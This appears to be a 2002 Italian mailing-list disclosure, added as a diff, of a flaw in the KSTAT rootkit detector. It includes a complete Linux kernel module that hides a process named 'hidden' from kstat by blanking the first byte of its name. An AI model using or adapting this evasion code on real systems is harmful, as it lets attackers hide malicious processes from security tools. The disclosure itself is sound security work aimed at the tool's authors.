@@ -1,0 +1,61 @@
+Data: 15 May 2002 17:03:38 -0000
+
+
+problema in KSTAT (2.4.x version)
+---------------------------------
+
+E' possibile nascondere processi a kstat in modo semplice e veloce..
+In KSTAT/2.4/src/ps.c, riga 97:
+
+                if(taskk.comm[0] != '\0') ; else continue;
+
+se taskk.comm[0]=='\0' il task verra' ignorato e quindi nascosto.
+Se possibile vorrei sapere che senso ha una condizione del genere, io
+la trovo inutile.
+
+ecco un piccolo modulo che permette di nascondere i task che hanno come
+nome "hidden":
+
+---------------------------------------------------------.
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <asm/uaccess.h>
+
+struct task_struct *
+find_task_by_name(char *name)
+{
+    struct task_struct *p;
+
+    for (p = &init_task; (p = p->next_task) != &init_task;)
+        if (strcmp(p->comm, name) == 0)
+            return p;
+    return NULL;
+
+}
+
+
+int
+init_module(void)
+{
+
+    struct task_struct *p;
+
+    if ((p = find_task_by_name("hidden")))
+        p->comm[0] = '\0';
+
+    return (0);
+}
+
+void cleanup_module(void) { }
+
+---------------------------------------------------------'
+EOF
